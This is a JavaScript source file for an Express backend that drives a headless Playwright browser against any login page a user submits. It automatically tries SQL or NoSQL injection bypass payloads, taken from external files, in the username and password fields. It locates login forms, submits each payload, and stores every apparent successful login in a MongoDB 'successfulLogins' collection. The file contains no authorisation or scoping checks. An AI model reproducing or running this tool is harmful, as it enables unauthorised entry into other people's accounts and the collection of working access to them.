const express = require('express');
const { chromium } = require('playwright');
const path = require('path');
const fs = require('fs');
const cors = require('cors'); // Import cors
require('dotenv').config(); // Load environment variables from .env file
const { MongoClient } = require('mongodb'); // Import MongoClient
const crypto = require('crypto'); // Import crypto for UUID generation

const app = express();
const PORT = 3000;

const activeScans = new Map(); // To store active browser instances by scanId

function uuidv4() {
    return crypto.randomBytes(16).toString('hex');
}

// Helper function to check if the current page appears to be a login page
async function isLoginPage(page, scanId) {
    const usernameFieldCount = await page.locator('input[name="username"], input[name="email"], input[name="phone"]').count();
    const passwordFieldCount = await page.locator('input[name="password"]').count();
    const submitButtonCount = await page.locator('button[type="submit"], input[type="submit"], button:has-text("Login"), button:has-text("Sign In")').count();

    const isLogin = (usernameFieldCount > 0 && passwordFieldCount > 0) || submitButtonCount > 0;
    if (isLogin) {
        console.log(`Scan ${scanId}: Page appears to be a login page.`);
    } else {
        console.log(`Scan ${scanId}: Page does not immediately appear to be a login page.`);
    }
    return isLogin;
}

// Helper function to find and click a login button
async function findAndClickLoginButton(page, scanId) {
    const loginButtonSelectors = [
        // Direct text matches (case-insensitive)
        'button:has-text(/Login|Sign In|Sign-In|Get Started|My Account|Client Login|Account/i)',
        'a:has-text(/Login|Sign In|Sign-In|Get Started|My Account|Client Login|Account/i)',
        'input[type="submit"][value=/Login|Sign In|Sign-In|Get Started|My Account|Client Login|Account/i]',
        'div:has-text(/Login|Sign In|Sign-In|Get Started|My Account|Client Login|Account/i)',
        'span:has-text(/Login|Sign In|Sign-In|Get Started|My Account|Client Login|Account/i)',

        // Common IDs and classes
        '#loginButton',
        '#signInButton',
        '#getStartedButton',
        '#accountButton',
        '.login-button',
        '.sign-in-button',
        '.get-started-button',
        '.account-link',
        '[data-testid="login-button"]',
        '[aria-label="Login"]',
        '[title="Login"]',
        '[data-testid="sign-in-button"]',
        '[aria-label="Sign In"]',
        '[title="Sign In"]',
        '[data-testid="get-started-button"]',
        '[aria-label="Get Started"]',
        '[title="Get Started"]',

        // More generic selectors that might lead to login
        'a[href*="/login"]',
        'a[href*="/signin"]',
        'a[href*="/account"]',
        'a[href*="/getstarted"]',
        'button[onclick*="login"]',
        'button[onclick*="signIn"]',
        'div[role="button"]:has-text(/Login|Sign In|Get Started/i)',
        'div[tabindex="0"]:has-text(/Login|Sign In|Get Started/i)'
    ];

    for (const selector of loginButtonSelectors) {
        try {
            const button = await page.locator(selector).first();
            if (await button.isVisible() && !button.isDisabled()) {
                console.log(`Scan ${scanId}: Clicking login/sign-in/join button with selector: ${selector}`);
                await button.click();
                // Use Promise.race to handle cases where navigation might not occur or takes too long
                await Promise.race([
                    page.waitForLoadState('networkidle', { timeout: 30000 }),
                    page.waitForTimeout(30000) // Max wait for navigation
                ]).catch(() => console.log(`Scan ${scanId}: Navigation after clicking "${selector}" timed out or did not occur, but continuing.`));
                console.log(`Scan ${scanId}: Navigated to ${page.url()} after clicking button.`);
                return true; // Button clicked and navigation attempted
            }
        } catch (e) {
            // Selector not found or not visible, continue to next
        }
    }
    console.log(`Scan ${scanId}: No login/sign-in/join button found or clicked.`);
    return false; // No button clicked
}

// Helper to determine form type
async function determineFormType(page, scanId) {
    const usernameFieldCount = await page.locator('input[name="username"], input[name="email"], input[name="phone"]').count();
    const passwordFieldCount = await page.locator('input[name="password"]').count();
    // We don't check submit button count here as it might be on a separate step

    if (usernameFieldCount > 0 && passwordFieldCount > 0) {
        console.log(`Scan ${scanId}: Detected a full login form.`);
        return 'full';
    } else if (usernameFieldCount > 0 && passwordFieldCount === 0) {
        console.log(`Scan ${scanId}: Detected a username-only login step.`);
        return 'username_only';
    }
    console.log(`Scan ${scanId}: No login fields immediately visible.`);
    return 'none';
}

// MongoDB Connection
const uri = process.env.MONGODB_URI;
const client = new MongoClient(uri);

async function connectToMongoDB() {
    try {
        await client.connect();
        console.log("Connected to MongoDB!");
    } catch (e) {
        console.error("Could not connect to MongoDB", e);
    }
}

connectToMongoDB();

app.use(express.json());
app.use(cors()); // Use cors middleware
app.use(express.static(__dirname));

app.post('/scan', async (req, res) => {
    const scanId = uuidv4(); // Generate a unique ID for this scan
    let browser;

    try {
        const { url, type, email } = req.body;

        if (!url || !type) {
            return res.status(400).json({ error: 'URL and type are required.' });
        }

        // Ensure the URL has a protocol
        let targetUrl = url;
        if (!targetUrl.startsWith('http://') && !targetUrl.startsWith('https://')) {
            targetUrl = `http://${targetUrl}`;
        }

        const payloadsPath = path.join(__dirname, type === 'sql' ? 'bypass' : 'nosqlbypass');
        let payloads;
        try {
            const data = fs.readFileSync(payloadsPath, 'utf8');
            const lines = data.split('\n').map(line => line.trim()).filter(line => line !== '' && !line.startsWith('//'));

            payloads = [];
            for (let i = 0; i < lines.length; i += 2) {
                if (lines[i].startsWith('Username:') && lines[i+1].startsWith('Password:')) {
                    const username = lines[i].substring('Username:'.length).trim();
                    const password = lines[i+1].substring('Password:'.length).trim();
                    payloads.push(`${username}::${password}`);
                }
            }
        } catch (error) {
            console.error(`Error reading payloads file: ${error.message}`);
            return res.status(500).json({ error: 'Failed to read payloads file.' });
        }

        browser = await chromium.launch({ headless: true }); // Launch in headless mode for deployment
        activeScans.set(scanId, browser); // Store the browser instance
        console.log(`Scan ${scanId}: Browser launched and stored.`);

        const page = await browser.newPage();
        console.log(`Scan ${scanId}: Navigating to ${targetUrl}`);
        await page.goto(targetUrl, { timeout: 90000, waitUntil: 'domcontentloaded' }); // Increased timeout to 90 seconds
        console.log(`Scan ${scanId}: Navigated to ${page.url()}`);

        let loginFormType = await determineFormType(page, scanId);

        if (loginFormType === 'none') {
            console.log(`Scan ${scanId}: Initial page is not a login form. Attempting to find and click a login/sign-in/join button.`);
            const buttonClicked = await findAndClickLoginButton(page, scanId);

            if (buttonClicked) {
                // After clicking, re-determine form type
                loginFormType = await determineFormType(page, scanId);
                if (loginFormType === 'none') {
                    console.error(`Scan ${scanId}: After clicking a button, still not on a recognizable login page or username-only step. Skipping scan for ${targetUrl}.`);
                    await browser.close();
                    activeScans.delete(scanId);
                    return res.status(400).json({ error: 'Could not navigate to a recognizable login page.', scanId });
                }
            } else {
                console.error(`Scan ${scanId}: No login/sign-in/join button found or clicked. Skipping scan for ${targetUrl}.`);
                await browser.close();
                activeScans.delete(scanId);
                return res.status(400).json({ error: 'No login/sign-in/join button found to navigate to login page.', scanId });
            }
        }

        // At this point, loginFormType should be 'full' or 'username_only'
        if (loginFormType === 'full') {
            console.log(`Scan ${scanId}: Detected a full login form.`);
            await page.waitForSelector('input[name="username"], input[name="email"], input[name="phone"]', { timeout: 60000 });
            console.log(`Scan ${scanId}: Username/email field found.`);
        } else if (loginFormType === 'username_only') {
            console.log(`Scan ${scanId}: Detected a username-only login step.`);
            await page.waitForSelector('input[name="username"], input[name="email"], input[name="phone"]', { timeout: 60000 });
            console.log(`Scan ${scanId}: Username/email field found for multi-step login.`);
        } else {
            // This case should ideally not be reached if the logic above is correct
            console.error(`Scan ${scanId}: Unexpected state: loginFormType is 'none' after all attempts. Aborting.`);
            await browser.close();
            activeScans.delete(scanId);
            return res.status(400).json({ error: 'Failed to identify login form structure.', scanId });
        }

        const results = [];
        const initialUrl = page.url(); // Capture the initial URL of the login page

        for (const payload of payloads) {
            // Check if the scan has been stopped
            if (!activeScans.has(scanId)) {
                console.log(`Scan ${scanId}: Aborted by user.`);
                return res.status(200).json({ message: 'Scan aborted by user.', scanId });
            }

            const [usernamePayload, passwordPayload] = payload.split('::');
            if (!usernamePayload || !passwordPayload) {
                console.warn(`Scan ${scanId}: Skipping malformed payload: ${payload}`);
                continue;
            }

            const finalUsername = email && email.trim() !== '' ? email.trim() : usernamePayload.trim();

            // Handle multi-step login if detected
            if (loginFormType === 'username_only') {
                console.log(`Scan ${scanId}: Handling username-only step for multi-step login.`);
                await page.fill('input[name="username"], input[name="Username"], input[name="email"], input[name="Email"], input[name="phone"]', finalUsername, { timeout: 60000 });
                console.log(`Scan ${scanId}: Username field filled. Looking for "Next" or "Continue" button.`);

                const nextButtonSelectors = [
                    'button:has-text(/Next|Continue/i)',
                    'input[type="submit"][value=/Next|Continue/i]',
                    '#nextButton',
                    '#continueButton',
                    '[aria-label="Next"]',
                    '[title="Next"]'
                ];

                let nextButtonClicked = false;
                for (const selector of nextButtonSelectors) {
                    try {
                        const button = await page.locator(selector).first();
                        if (await button.isVisible() && !button.isDisabled()) {
                            console.log(`Scan ${scanId}: Clicking "Next" button with selector: ${selector}`);
                            await button.click();
                            await Promise.race([
                                page.waitForLoadState('networkidle', { timeout: 30000 }),
                                page.waitForTimeout(30000)
                            ]).catch(() => console.log(`Scan ${scanId}: Navigation after clicking "${selector}" timed out or did not occur, but continuing.`));
                            nextButtonClicked = true;
                            break;
                        }
                    } catch (e) {
                        // Selector not found or not visible, continue to next
                    }
                }

                if (!nextButtonClicked) {
                    console.error(`Scan ${scanId}: Could not find "Next" or "Continue" button for multi-step login. Aborting payload.`);
                    results.push({ payload: { username: finalUsername, password: passwordPayload.trim() }, success: false, error: 'Multi-step login: "Next" button not found.' });
                    await page.goto(initialUrl, { timeout: 60000, waitUntil: 'domcontentloaded' }); // Go back to the initial login page
                    continue;
                }

                console.log(`Scan ${scanId}: "Next" button clicked. Waiting for password field.`);
                await page.waitForSelector('input[name="password"], input[name="Password"]', { timeout: 60000 });
                console.log(`Scan ${scanId}: Password field found after "Next" step.`);
            }

            // Wait for the username and password input fields to be visible
            console.log(`Scan ${scanId}: Waiting for username field...`);
            await page.waitForSelector('input[name="username"], input[name="email"], input[name="phone"]', { timeout: 60000 });
            console.log(`Scan ${scanId}: Username field found.`);

            // Log current URL and page content before waiting for password field
            console.log(`Scan ${scanId}: Current URL before password field check: ${page.url()}`);


            try {
                console.log(`Scan ${scanId}: Filling username with: ${finalUsername}`);
                    console.log(`Scan ${scanId}: Attempting to fill username field with: ${finalUsername}`);
                    await page.fill('input[name="username"], input[name="Username"], input[name="email"], input[name="Email"], input[name="phone"]', finalUsername, { timeout: 60000 });
                    console.log(`Scan ${scanId}: Username field filled.`);
                    await page.waitForLoadState('networkidle'); // Wait for page to settle after filling username
                    console.log(`Scan ${scanId}: Current URL after filling username: ${page.url()}`);


                    // Attempt to find password field on the same page first
                    const passwordFieldSelector = 'input[name="password"], input[name="Password"]';
                    let passwordField = await page.locator(passwordFieldSelector).first();

                    if (await passwordField.isVisible()) {
                        console.log(`Scan ${scanId}: Password field found on the same page. Filling password.`);
                        console.log(`Scan ${scanId}: Attempting to fill password field with: ${passwordPayload}`);
                    await passwordField.fill(passwordPayload.trim(), { timeout: 60000 });
                    console.log(`Scan ${scanId}: Password field filled.`);
                    // Skip next button logic and proceed to submit
                } else {
                    console.log(`Scan ${scanId}: Password field not found on the same page. Waiting for 3 seconds and re-checking.`);
                    await page.waitForTimeout(3000); // Wait for dynamic content to load
                    passwordField = await page.locator(passwordFieldSelector).first(); // Re-check for password field

                    if (await passwordField.isVisible()) {
                        console.log(`Scan ${scanId}: Password field found after waiting. Filling password.`);
                        await passwordField.fill(passwordPayload.trim(), { timeout: 60000 });
                        console.log(`Scan ${scanId}: Password field filled.`);
                    } else {
                        console.log(`Scan ${scanId}: Password field still not found. Proceeding with "Log In" button logic.`);

                        const loginButtonSelectors = [
                            'button:has-text(/Log In/i)', // Case-insensitive "Log In"
                            'button[type="submit"]:has-text(/Log In/i)',
                            'div[role="button"]:has-text(/Log In/i)',
                            'button[type="submit"]', // Generic submit button
                            'button[role="button"]', // Generic button role
                        ];

                        let loginButtonClicked = false;
                        for (const selector of loginButtonSelectors) {
                            try {
                                const button = await page.locator(selector).first();
                                if (await button.isVisible() && !button.isDisabled()) {
                                    console.log(`Scan ${scanId}: Clicking "Log In" button with selector: ${selector}`);
                                    await button.click();
                                    await page.waitForLoadState('networkidle'); // Wait for navigation after click
                                    loginButtonClicked = true;
                                    break;
                                }
                            } catch (e) {
                                console.log(`Scan ${scanId}: "Log In" button selector "${selector}" not found, not visible, or disabled.`);
                            }
                        }

                        if (loginButtonClicked) {
                            console.log(`Scan ${scanId}: "Log In" button clicked, waiting for password field on the new page or dynamically loaded.`);
                            await page.waitForSelector(passwordFieldSelector, { timeout: 60000 });
                            console.log(`Scan ${scanId}: Password field found after "Log In" button click.`);
                            await page.fill(passwordFieldSelector, passwordPayload.trim(), { timeout: 60000 });
                            console.log(`Scan ${scanId}: Password field filled.`);
                        } else {
                            console.log(`Scan ${scanId}: No specific "Log In" button was clicked, proceeding to find password field on the current page (fallback).`);
                            await page.waitForSelector(passwordFieldSelector, { timeout: 60000 });
                            console.log(`Scan ${scanId}: Password field found (fallback).`);
                            await page.fill(passwordFieldSelector, passwordPayload.trim(), { timeout: 60000 });
                            console.log(`Scan ${scanId}: Password field filled (fallback).`);
                        }
                    }
                }
            } catch (fillError) {
                console.error(`Scan ${scanId}: Error filling username/password field for payload ${payload}: ${fillError.message}`);
                results.push({ payload: { username: finalUsername, password: passwordPayload.trim() }, success: false, error: `Fill error: ${fillError.message}` });
                await page.goto(initialUrl, { timeout: 60000, waitUntil: 'domcontentloaded' }); // Go back to the initial login page
                continue;
            }

            // Make submit button selection more flexible
            const submitButtonSelectors = [
                'button[type="submit"]',
                'input[type="submit"]',
                'button:has-text("Submit")',
                'button:has-text("Login")',
                'button:has-text("Sign In")',
                'input[value="Submit"]',
                'input[value="Login"]',
                'input[value="Sign In"]',
                '#submitButton',
                '#loginButton'
            ];

            let submitButtonClicked = false;
            console.log(`Scan ${scanId}: Attempting to click submit button...`);
            for (const selector of submitButtonSelectors) {
                try {
                    const button = await page.locator(selector).first();
                    if (await button.isVisible()) {
                        console.log(`Scan ${scanId}: Clicking submit button with selector: ${selector}`);
                        await button.click();
                        submitButtonClicked = true;
                        break;
                    }
                } catch (e) {
                    console.log(`Scan ${scanId}: Submit button selector "${selector}" not found or not visible.`);
                    // Selector not found or not visible, continue to next
                }
            }

            if (!submitButtonClicked) {
                console.error(`Scan ${scanId}: Could not find a clickable submit button for payload: ${payload}`);
                results.push({ payload: { username: finalUsername, password: passwordPayload.trim() }, success: false, error: 'No clickable submit button found.' });
                await page.goto(initialUrl, { timeout: 60000, waitUntil: 'domcontentloaded' }); // Go back to the initial login page for the next payload
                continue;
            }
            console.log(`Scan ${scanId}: Submit button clicked.`);
            // await page.waitForLoadState('networkidle'); // Wait for page to settle after submission
            await Promise.race([
                page.waitForNavigation({ waitUntil: 'networkidle' }).catch(() => {}), // Wait for navigation or timeout
                page.waitForSelector('body').catch(() => {}) // Wait for body to be present or timeout
            ]);



            const currentUrl = page.url();


            let success = false;
            let successfulLogin = null; // Initialize a variable to store the first successful login

            // Define common failure message selectors
            const failureMessageSelectors = [
                'text=Invalid credentials',
                'text=Incorrect username or password',
                'text=Login failed',
                'text=Authentication failed',
                'text=Access denied',
                'text=Wrong username or password',
                'div.error-message', // Common class for error messages
                'span.error',        // Another common class for error messages
                '#login-error',      // Common ID for login error messages
                '#message.error'     // Another common ID for error messages
            ];

            let failureMessageFound = false;
            for (const selector of failureMessageSelectors) {
                try {
                    const locator = page.locator(selector);
                    if (await locator.isVisible()) {
                        console.log(`Scan ${scanId}: Login failed: Found failure message with selector: "${selector}"`);
                        failureMessageFound = true;
                        break;
                    }
                } catch (e) {
                    // Selector not found, continue to next
                }
            }

            if (failureMessageFound) {
                success = false; // Explicitly set to false if a failure message is found
                console.log(`Scan ${scanId}: Login failed due to explicit failure message.`);
            } else {
                // Ensure the page is fully loaded before checking for login fields
                await page.waitForLoadState('domcontentloaded');

                // Check if the login fields (username/email and password) are still present
                // If they are not present, it indicates a successful login/redirection away from the login form.
                const usernameFieldCount = await page.locator('input[name="username"], input[name="email"], input[name="phone"]').count();
                const passwordFieldCount = await page.locator('input[name="password"]').count();
                const submitButtonCount = await page.locator('button[type="submit"], input[type="submit"], button:has-text("Login"), button:has-text("Sign In")').count();

                const loginFieldsStillPresent = (usernameFieldCount > 0 || passwordFieldCount > 0 || submitButtonCount > 0);

                if (!loginFieldsStillPresent) {
                    success = true;
                    successfulLogin = {
                        website: targetUrl,
                        username: finalUsername,
                        password: passwordPayload.trim()
                    };
                    if (email && email.trim() !== '') {
                        successfulLogin.email = email;
                    }
                    console.log(`Scan ${scanId}: Login successful: Login fields are no longer present.`);

                    // Store successful login in MongoDB
                    try {
                        const database = client.db("injection"); // Specify your database name
                        const collection = database.collection("successfulLogins");
                        await collection.insertOne(successfulLogin);
                        console.log(`Scan ${scanId}: Successful login stored in MongoDB:`, successfulLogin);
                    } catch (dbError) {
                        console.error(`Scan ${scanId}: Error storing successful login in MongoDB:`, dbError);
                    }
                } else {
                    console.log(`Scan ${scanId}: Login failed: Login fields are still present on the page.`);
                }
            }
            results.push({ payload: { username: usernamePayload.trim(), password: passwordPayload.trim() }, success });
            await page.goto(initialUrl, { timeout: 60000, waitUntil: 'domcontentloaded' }); // Go back to the initial login page for the next payload
        }

        console.log(`Scan ${scanId}: Scan complete. Results:`, results);
        console.log(`Scan ${scanId}: Sending scan results to frontend.`);
        res.json({ message: 'Scan complete', results, successfulLogin, scanId }); // Include successfulLogin and scanId in the response
    } catch (error) {
        console.error(`Scan ${scanId}: Error during scan:`, error);
        res.status(500).json({ message: 'Error during scan', error: error.message, scanId });
    } finally {
        if (browser) {
            await browser.close();
            console.log(`Scan ${scanId}: Playwright browser closed.`);
        }
        activeScans.delete(scanId); // Clean up the active scan
        console.log(`Scan ${scanId}: Removed from active scans.`);
    }
});

app.post('/stop-scan', async (req, res) => {
    const { scanId } = req.body;

    if (!scanId) {
        return res.status(400).json({ error: 'Scan ID is required to stop a scan.' });
    }

    const browser = activeScans.get(scanId);

    if (browser) {
        try {
            await browser.close();
            activeScans.delete(scanId);
            console.log(`Scan ${scanId}: Playwright browser closed and scan removed from active scans.`);
            res.json({ message: `Scan ${scanId} successfully stopped.` });
        } catch (error) {
            console.error(`Scan ${scanId}: Error closing browser:`, error);
            res.status(500).json({ error: `Failed to stop scan ${scanId}.`, details: error.message });
        }
    } else {
        console.log(`Scan ${scanId}: No active scan found with this ID.`);
        res.status(404).json({ error: `No active scan found with ID ${scanId}.` });
    }
});

app.listen(PORT, () => {
    console.log(`Backend server listening at http://localhost:${PORT}`);
});